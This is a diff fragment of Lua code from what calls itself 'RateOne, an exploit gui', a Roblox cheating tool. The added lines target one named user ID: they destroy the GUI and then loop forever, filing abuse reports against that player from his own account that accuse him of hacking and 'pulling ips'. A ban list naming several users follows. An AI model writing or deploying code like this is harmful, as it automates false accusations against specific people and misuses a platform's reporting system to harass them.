@@ -22,6 +22,14 @@ end)
 
 end
 
+if game.Players.LocalPlayer.UserId == 82628858 then
+	screenGui:Destroy()
+	while wait() do
+		game.Players:ReportAbuse("He's hacking and likes to pull ips, this is from RateOne, an exploit gui.",game.Players.LocalPlayer)
+		wait(1)
+	end
+end
+
 ----------------------------------- BANLIST
 ---- Gottabigcarnamed (1265448855)  and lablacaretheverybade(3743998626) and Tonstar007(82628858) and ichbineinopa(1011387148)
 if game:service('Players').LocalPlayer.UserId == 1265448855 or game:service('Players').LocalPlayer.UserId == 3743998626 or game:service('Players').LocalPlayer.UserId == 82628858 or game:service('Players').LocalPlayer.UserId == 1011387148 then
